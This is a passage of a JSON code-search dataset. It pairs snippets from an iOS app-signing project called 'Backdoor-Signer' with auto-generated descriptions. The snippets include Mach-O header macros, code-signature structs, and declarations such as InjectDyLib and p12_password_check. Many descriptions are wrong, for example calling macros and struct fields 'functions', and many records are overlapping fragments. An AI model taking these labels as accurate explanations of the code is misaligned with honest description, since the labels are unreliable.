    "code_type": "function"
  },
  {
    "id": "928",
    "code": "#define CPU_SUBTYPE_PENTIUM_3 CPU_SUBTYPE_INTEL(8, 0)\n#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "929",
    "code": "#define CPU_SUBTYPE_PENTIUM_3_M CPU_SUBTYPE_INTEL(8, 1)\n#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "930",
    "code": "#define CPU_SUBTYPE_PENTIUM_3_XEON CPU_SUBTYPE_INTEL(8, 2)\n#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "931",
    "code": "#define CPU_SUBTYPE_PENTIUM_M CPU_SUBTYPE_INTEL(9, 0)\n#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "932",
    "code": "#define CPU_SUBTYPE_PENTIUM_4 CPU_SUBTYPE_INTEL(10, 0)\n#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "933",
    "code": "#define CPU_SUBTYPE_PENTIUM_4_M CPU_SUBTYPE_INTEL(10, 1)\n#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n\n#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "934",
    "code": "#define CPU_SUBTYPE_ITANIUM CPU_SUBTYPE_INTEL(11, 0)\n#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n\n#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)\n#define CPU_SUBTYPE_INTEL_MODEL_ALL 0",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "935",
    "code": "#define CPU_SUBTYPE_ITANIUM_2 CPU_SUBTYPE_INTEL(11, 1)\n#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n\n#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)\n#define CPU_SUBTYPE_INTEL_MODEL_ALL 0\n",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "936",
    "code": "#define CPU_SUBTYPE_XEON CPU_SUBTYPE_INTEL(12, 0)\n#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n\n#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)\n#define CPU_SUBTYPE_INTEL_MODEL_ALL 0\n\n/*",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "937",
    "code": "#define CPU_SUBTYPE_XEON_MP CPU_SUBTYPE_INTEL(12, 1)\n\n#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n\n#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)\n#define CPU_SUBTYPE_INTEL_MODEL_ALL 0\n\n/*\n*\tX86 subtypes.",
    "nl": "Function CPU_SUBTYPE_INTEL - implements cpu subtype intel functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "938",
    "code": "#define CPU_SUBTYPE_INTEL_FAMILY(x) ((x) & 15)\n#define CPU_SUBTYPE_INTEL_FAMILY_MAX 15\n\n#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)\n#define CPU_SUBTYPE_INTEL_MODEL_ALL 0\n\n/*\n*\tX86 subtypes.\n*/\n",
    "nl": "Function CPU_SUBTYPE_INTEL_FAMILY - implements cpu subtype intel family functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "939",
    "code": "#define CPU_SUBTYPE_INTEL_MODEL(x) ((x) >> 4)\n#define CPU_SUBTYPE_INTEL_MODEL_ALL 0\n\n/*\n*\tX86 subtypes.\n*/\n\n#define CPU_SUBTYPE_X86_ALL 3\n#define CPU_SUBTYPE_X86_64_ALL 3\n#define CPU_SUBTYPE_X86_ARCH1 4",
    "nl": "Function CPU_SUBTYPE_INTEL_MODEL - implements cpu subtype intel model functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "940",
    "code": "#define LC_SYMSEG 0x00000003         /* link-edit gdb symbol table info (obsolete) */\n#define LC_THREAD 0x00000004         /* thread */\n#define LC_UNIXTHREAD 0x00000005     /* unix thread (includes a stack) */\n#define LC_LOADFVMLIB 0x00000006     /* load a specified fixed VM shared library */\n#define LC_IDFVMLIB 0x00000007       /* fixed VM shared library identification */\n#define LC_IDENT 0x00000008          /* object identification info (obsolete) */\n#define LC_FVMFILE 0x00000009        /* fixed VM file inclusion (internal use) */\n#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */\n#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */\n#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */",
    "nl": "Function info - implements info functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "941",
    "code": "#define LC_UNIXTHREAD 0x00000005     /* unix thread (includes a stack) */\n#define LC_LOADFVMLIB 0x00000006     /* load a specified fixed VM shared library */\n#define LC_IDFVMLIB 0x00000007       /* fixed VM shared library identification */\n#define LC_IDENT 0x00000008          /* object identification info (obsolete) */\n#define LC_FVMFILE 0x00000009        /* fixed VM file inclusion (internal use) */\n#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */\n#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */\n#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */\n#define LC_ID_DYLIB 0x0000000d       /* dynamicly linked shared lib identification */\n#define LC_LOAD_DYLINKER 0x0000000e  /* load a dynamic linker */",
    "nl": "Function thread - implements thread functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "942",
    "code": "#define LC_FVMFILE 0x00000009        /* fixed VM file inclusion (internal use) */\n#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */\n#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */\n#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */\n#define LC_ID_DYLIB 0x0000000d       /* dynamicly linked shared lib identification */\n#define LC_LOAD_DYLINKER 0x0000000e  /* load a dynamic linker */\n#define LC_ID_DYLINKER 0x0000000f    /* dynamic linker identification */\n#define LC_PREBOUND_DYLIB 0x00000010 /* modules prebound for a dynamicly */\n#define LC_ROUTINES 0x00000011\n#define LC_SUB_FRAMEWORK 0x00000012",
    "nl": "Function inclusion - implements inclusion functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "943",
    "code": "#define LC_PREPAGE 0x0000000a        /* prepage command (internal use) */\n#define LC_DYSYMTAB 0x0000000b       /* dynamic link-edit symbol table info */\n#define LC_LOAD_DYLIB 0x0000000c     /* load a dynamicly linked shared library */\n#define LC_ID_DYLIB 0x0000000d       /* dynamicly linked shared lib identification */\n#define LC_LOAD_DYLINKER 0x0000000e  /* load a dynamic linker */\n#define LC_ID_DYLINKER 0x0000000f    /* dynamic linker identification */\n#define LC_PREBOUND_DYLIB 0x00000010 /* modules prebound for a dynamicly */\n#define LC_ROUTINES 0x00000011\n#define LC_SUB_FRAMEWORK 0x00000012\n#define LC_SUB_UMBRELLA 0x00000013",
    "nl": "Function command - implements command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "944",
    "code": "#pragma pack(push, 1)\n\nstruct fat_header\n{",
    "nl": "struct define",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "945",
    "code": "struct fat_header\n{",
    "nl": "struct fat_header - implements fat_header functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "946",
    "code": "struct fat_arch\n{",
    "nl": "struct fat_arch - implements fat_arch functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "947",
    "code": "struct mach_header\n{",
    "nl": "struct mach_header - implements mach_header functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "948",
    "code": "struct mach_header_64\n{",
    "nl": "struct mach_header_64 - implements mach_header_64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "949",
    "code": "struct load_command\n{",
    "nl": "struct load_command - implements load_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "950",
    "code": "struct uuid_command\n{",
    "nl": "struct uuid_command - implements uuid_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "951",
    "code": "struct entry_point_command\n{",
    "nl": "struct entry_point_command - implements entry_point_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "952",
    "code": "struct codesignature_command\n{",
    "nl": "struct codesignature_command - implements codesignature_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "953",
    "code": "struct encryption_info_command\n{",
    "nl": "struct encryption_info_command - implements encryption_info_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "954",
    "code": "struct encryption_info_command_64\n{",
    "nl": "struct encryption_info_command_64 - implements encryption_info_command_64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "955",
    "code": "struct segment_command\n{                       /* for 32-bit architectures */",
    "nl": "struct segment_command - implements segment_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "956",
    "code": "struct segment_command_64\n{                       /* for 64-bit architectures */",
    "nl": "struct segment_command_64 - implements segment_command_64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "957",
    "code": "struct section\n{                       /* for 32-bit architectures */",
    "nl": "struct section - implements section functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "958",
    "code": "uint32_t align;     /* section alignment (power of 2) */",
    "nl": "Function alignment - implements alignment functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "959",
    "code": "struct section_64\n{                       /* for 64-bit architectures */",
    "nl": "struct section_64 - implements section_64 functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "960",
    "code": "uint32_t align;     /* section alignment (power of 2) */",
    "nl": "Function alignment - implements alignment functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "961",
    "code": "struct dylib\n{",
    "nl": "struct dylib - implements dylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "962",
    "code": "struct dylib_command\n{",
    "nl": "struct dylib_command - implements dylib_command functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "963",
    "code": "struct dylib dylib; /* the library identification */\n};\n\n#pragma pack(pop)\n\n//////CodeSignature\n\nenum\n{",
    "nl": "struct dylib - implements dylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "964",
    "code": "#pragma pack(pop)\n\n//////CodeSignature\n\nenum\n{",
    "nl": "Function pack - implements pack functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "965",
    "code": "CSMAGIC_REQUIREMENTS = 0xfade0c01,              /* Requirements vector (internal requirements) */\nCSMAGIC_CODEDIRECTORY = 0xfade0c02,             /* CodeDirectory blob */\nCSMAGIC_EMBEDDED_SIGNATURE = 0xfade0cc0,        /* embedded form of signature data */\nCSMAGIC_EMBEDDED_SIGNATURE_OLD = 0xfade0b02,    /* XXX */\nCSMAGIC_EMBEDDED_ENTITLEMENTS = 0xfade7171,     /* embedded entitlements */\nCSMAGIC_EMBEDDED_DER_ENTITLEMENTS = 0xfade7172, /* der format entitlements */\nCSMAGIC_DETACHED_SIGNATURE = 0xfade0cc1,        /* multi-arch collection of embedded signatures */\nCSMAGIC_BLOBWRAPPER = 0xfade0b01,               /* CMS Signature, among other things */\nCS_SUPPORTSSCATTER = 0x20100,\nCS_SUPPORTSTEAMID = 0x20200,",
    "nl": "Function vector - implements vector functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "966",
    "code": "#pragma pack(push, 1)\n\n/*\n* Structure of an embedded-signature SuperBlob\n*/\nstruct CS_BlobIndex\n{",
    "nl": "Function pack - implements pack functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "967",
    "code": "struct CS_BlobIndex\n{",
    "nl": "struct CS_BlobIndex - implements functionality related to c s blob index",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "968",
    "code": "struct CS_SuperBlob\n{",
    "nl": "struct CS_SuperBlob - implements functionality related to c s super blob",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "969",
    "code": "struct CS_CodeDirectory\n{",
    "nl": "struct CS_CodeDirectory - implements functionality related to c s code directory",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "970",
    "code": "uint32_t magic;         /* magic number (CSMAGIC_CODEDIRECTORY) */",
    "nl": "Function number - implements number functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "971",
    "code": "uint32_t nCodeSlots;    /* number of ordinary (code) hash slots */",
    "nl": "Function ordinary - implements ordinary functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "972",
    "code": "uint8_t hashType;       /* type of hash (cdHashType* constants) */",
    "nl": "Function hash - checks if it has h",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "973",
    "code": "struct CS_Entitlement\n{",
    "nl": "struct CS_Entitlement - implements functionality related to c s entitlement",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "974",
    "code": "struct CS_GenericBlob\n{",
    "nl": "struct CS_GenericBlob - implements functionality related to c s generic blob",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "975",
    "code": "struct CS_Scatter\n{",
    "nl": "struct CS_Scatter - implements functionality related to c s scatter",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "struct"
  },
  {
    "id": "976",
    "code": "#pragma pack(pop)\n",
    "nl": "Function pack - implements pack functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/common/mach-o.h",
    "code_type": "function"
  },
  {
    "id": "977",
    "code": "bool p12_password_check(NSString *file, NSString *pass);",
    "nl": "Function p12_password_check - implements p12 password check functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.hpp",
    "code_type": "function"
  },
  {
    "id": "978",
    "code": "void provision_file_validation(NSString *path);",
    "nl": "Function provision_file_validation - implements provision file validation functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.hpp",
    "code_type": "function"
  },
  {
    "id": "979",
    "code": "void generate_root_ca_pair(const char *basename);",
    "nl": "Function generate_root_ca_pair - implements generate root ca pair functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/openssl_tools.hpp",
    "code_type": "function"
  },
  {
    "id": "980",
    "code": "bool InjectDyLib(NSString *filePath, NSString *dylibPath, bool weakInject, bool bCreate);",
    "nl": "Function InjectDyLib - implements injectdylib functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp",
    "code_type": "function"
  },
  {
    "id": "981",
    "code": "bool ChangeDylibPath(NSString *filePath, NSString *oldPath, NSString *newPath);",
    "nl": "Function ChangeDylibPath - implements changedylibpath functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp",
    "code_type": "function"
  },
  {
    "id": "982",
    "code": "bool ListDylibs(NSString *filePath, NSMutableArray *dylibPathsArray);",
    "nl": "Function ListDylibs - implements listdylibs functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp",
    "code_type": "function"
  },
  {
    "id": "983",
    "code": "bool UninstallDylibs(NSString *filePath, NSArray<NSString *> *dylibPathsArray);",
    "nl": "Function UninstallDylibs - implements uninstalldylibs functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp",
    "code_type": "function"
  },
  {
    "id": "984",
    "code": "int zsign(NSString *app, NSString *prov, NSString *key, NSString *pass, NSString *bundleid, NSString *displayname,\nNSString *bundleversion, bool dontGenerateEmbeddedMobileProvision);",
    "nl": "Function zsign - implements zsign functionality",
    "language": "cpp",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/zsign/zsign.hpp",
    "code_type": "function"
  },
  {
    "id": "985",
    "code": "struct AppContext {\nlet currentScreen: String\nlet additionalData: [String: Any]\n\nfunc toString() -> String {",
    "nl": "/ Represents the current state of the app for AI context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/AppContext.swift",
    "code_type": "struct"
  },
  {
    "id": "986",
    "code": "func toString() -> String {\nvar result = \"Current Screen: \\(currentScreen)\\n\"\nresult += \"App Data:\\n\"\nfor (key, value) in additionalData {",
    "nl": "Function toString - implements tostring functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/AppContext.swift",
    "code_type": "function"
  },
  {
    "id": "987",
    "code": "class FRSITableViewController: FRSTableViewController {\nvar signingDataWrapper: SigningDataWrapper\nvar mainOptions: SigningMainDataWrapper\n\ninit(signingDataWrapper: SigningDataWrapper, mainOptions: SigningMainDataWrapper) {",
    "nl": "Import the necessary signing data types",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSITableViewController.swift",
    "code_type": "class"
  },
  {
    "id": "988",
    "code": "class FRSTableViewController: UITableViewController {\nvar tableData: [[String]] = [[]]\nvar sectionTitles: [String] = []\n\ninit() {",
    "nl": "class FRSTableViewController - Controls user interface and application flow",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Common/FRSTableViewController.swift",
    "code_type": "class"
  },
  {
    "id": "989",
